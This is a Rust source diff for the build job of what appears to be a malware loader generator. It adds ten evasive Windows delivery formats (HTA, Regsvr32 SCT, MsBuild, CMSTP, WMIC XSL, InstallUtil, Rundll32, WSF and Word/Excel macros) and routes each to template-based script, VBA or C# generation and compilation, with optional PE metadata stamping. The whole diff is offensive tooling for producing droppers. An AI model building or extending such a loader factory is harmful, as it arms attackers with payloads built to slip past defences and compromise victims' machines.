@@ -11,8 +11,9 @@ use crate::{
     state::AppState,
 };
 use template_engine::{
-    generate_loader_source, Encryption, Feature,
-    LoaderConfig, LoaderType,
+    generate_loader_source, generate_script_source, generate_vba_source,
+    generate_csharp_source, Encryption, Feature, LoaderConfig, LoaderType,
+    OutputCategory,
 };
 
 #[derive(Deserialize)]
@@ -61,10 +62,20 @@ fn run_build(
     jobs.set_status(&job_id, JobStatus::Building { progress: 5, msg: "Parsing config...".into() });
 
     let loader_type = match req.loader_type.as_str() {
-        "Binary"    => LoaderType::Binary,
-        "Dll"       => LoaderType::Dll,
-        "AppDomain" => LoaderType::AppDomain,
-        "Injector"  => LoaderType::Injector,
+        "Binary"      => LoaderType::Binary,
+        "Dll"         => LoaderType::Dll,
+        "AppDomain"   => LoaderType::AppDomain,
+        "Injector"    => LoaderType::Injector,
+        "Rundll32"    => LoaderType::Rundll32,
+        "Wsf"         => LoaderType::Wsf,
+        "Hta"         => LoaderType::Hta,
+        "Regsvr32Sct" => LoaderType::Regsvr32Sct,
+        "MsBuild"     => LoaderType::MsBuild,
+        "Cmstp"       => LoaderType::Cmstp,
+        "WmicXsl"     => LoaderType::WmicXsl,
+        "DocxMacro"   => LoaderType::DocxMacro,
+        "XlsxMacro"   => LoaderType::XlsxMacro,
+        "InstallUtil" => LoaderType::InstallUtil,
         t => {
             jobs.set_status(&job_id, JobStatus::Error { msg: format!("unknown loader type: {}", t) });
             return;
@@ -113,47 +124,96 @@ fn run_build(
 
     jobs.set_status(&job_id, JobStatus::Building { progress: 10, msg: "Generating source...".into() });
 
-    let source = match generate_loader_source(&loader_cfg) {
-        Ok(s)  => s,
-        Err(e) => { jobs.set_status(&job_id, JobStatus::Error { msg: e }); return; }
-    };
-
     let job_dir = PathBuf::from(&cfg.artifacts_dir).join(&job_id);
     if let Err(e) = std::fs::create_dir_all(&job_dir) {
         jobs.set_status(&job_id, JobStatus::Error { msg: e.to_string() });
         return;
     }
-    let src_path = job_dir.join("loader_config.rs");
-    if let Err(e) = std::fs::write(&src_path, &source) {
-        jobs.set_status(&job_id, JobStatus::Error { msg: e.to_string() });
-        return;
-    }
 
-    jobs.set_status(&job_id, JobStatus::Building { progress: 30, msg: "Compiling...".into() });
-
-    let (out_ext, crate_type) = match loader_cfg.loader_type {
-        LoaderType::Binary | LoaderType::Injector => ("exe", "bin"),
-        _                                          => ("dll", "cdylib"),
-    };
+    let category = loader_cfg.loader_type.category();
+    let out_ext  = loader_cfg.loader_type.output_extension();
     let out_path = job_dir.join(format!("loader.{}", out_ext));
 
-    if let Err(e) = compile_loader(
-        src_path.to_str().unwrap(),
-        &cfg.scaffold_rlib,
-        out_path.to_str().unwrap(),
-        crate_type,
-        &tx,
-    ) {
-        jobs.set_status(&job_id, JobStatus::Error { msg: e.to_string() });
-        return;
-    }
+    match category {
+        OutputCategory::PeCompiled => {
+            let source = match generate_loader_source(&loader_cfg) {
+                Ok(s)  => s,
+                Err(e) => { jobs.set_status(&job_id, JobStatus::Error { msg: e }); return; }
+            };
+            let src_path = job_dir.join("loader_config.rs");
+            if let Err(e) = std::fs::write(&src_path, &source) {
+                jobs.set_status(&job_id, JobStatus::Error { msg: e.to_string() });
+                return;
+            }
 
-    // Apply PE metadata if requested
-    if let Some(pe_meta) = &req.pe_config {
-        if let Err(e) = crate::builder::pe_sign::apply_pe_metadata(
-            out_path.to_str().unwrap(), pe_meta, &tx,
-        ) {
-            error!("PE metadata failed: {}", e);
+            jobs.set_status(&job_id, JobStatus::Building { progress: 30, msg: "Compiling Rust source...".into() });
+
+            let crate_type = match loader_cfg.loader_type {
+                LoaderType::Binary | LoaderType::Injector => "bin",
+                _                                          => "cdylib",
+            };
+
+            if let Err(e) = compile_loader(
+                src_path.to_str().unwrap(),
+                &cfg.scaffold_rlib,
+                out_path.to_str().unwrap(),
+                crate_type,
+                &tx,
+            ) {
+                jobs.set_status(&job_id, JobStatus::Error { msg: e.to_string() });
+                return;
+            }
+
+            // Apply PE metadata if requested
+            if let Some(pe_meta) = &req.pe_config {
+                if let Err(e) = crate::builder::pe_sign::apply_pe_metadata(
+                    out_path.to_str().unwrap(), pe_meta, &tx,
+                ) {
+                    error!("PE metadata failed: {}", e);
+                }
+            }
+        }
+        OutputCategory::ScriptText => {
+            jobs.set_status(&job_id, JobStatus::Building { progress: 60, msg: "Rendering script template...".into() });
+            let source = match generate_script_source(&loader_cfg) {
+                Ok(s)  => s,
+                Err(e) => { jobs.set_status(&job_id, JobStatus::Error { msg: e }); return; }
+            };
+            if let Err(e) = std::fs::write(&out_path, &source) {
+                jobs.set_status(&job_id, JobStatus::Error { msg: e.to_string() });
+                return;
+            }
+        }
+        OutputCategory::VbaText => {
+            jobs.set_status(&job_id, JobStatus::Building { progress: 60, msg: "Rendering VBA macro source (copy-paste manually into Office)...".into() });
+            let source = match generate_vba_source(&loader_cfg) {
+                Ok(s)  => s,
+                Err(e) => { jobs.set_status(&job_id, JobStatus::Error { msg: e }); return; }
+            };
+            if let Err(e) = std::fs::write(&out_path, &source) {
+                jobs.set_status(&job_id, JobStatus::Error { msg: e.to_string() });
+                return;
+            }
+        }
+        OutputCategory::DotNetCompiled => {
+            jobs.set_status(&job_id, JobStatus::Building { progress: 30, msg: "Generating C# source...".into() });
+            let cs_source = match generate_csharp_source(&loader_cfg) {
+                Ok(s)  => s,
+                Err(e) => { jobs.set_status(&job_id, JobStatus::Error { msg: e }); return; }
+            };
+            let cs_path = job_dir.join("Loader.cs");
+            if let Err(e) = std::fs::write(&cs_path, &cs_source) {
+                jobs.set_status(&job_id, JobStatus::Error { msg: e.to_string() });
+                return;
+            }
+            jobs.set_status(&job_id, JobStatus::Building { progress: 60, msg: "Compiling C# with csc.exe / mcs...".into() });
+            if let Err(e) = crate::builder::csharp_runner::compile_csharp(
+                cs_path.to_str().unwrap(),
+                out_path.to_str().unwrap(),
+            ) {
+                jobs.set_status(&job_id, JobStatus::Error { msg: e });
+                return;
+            }
         }
     }
 
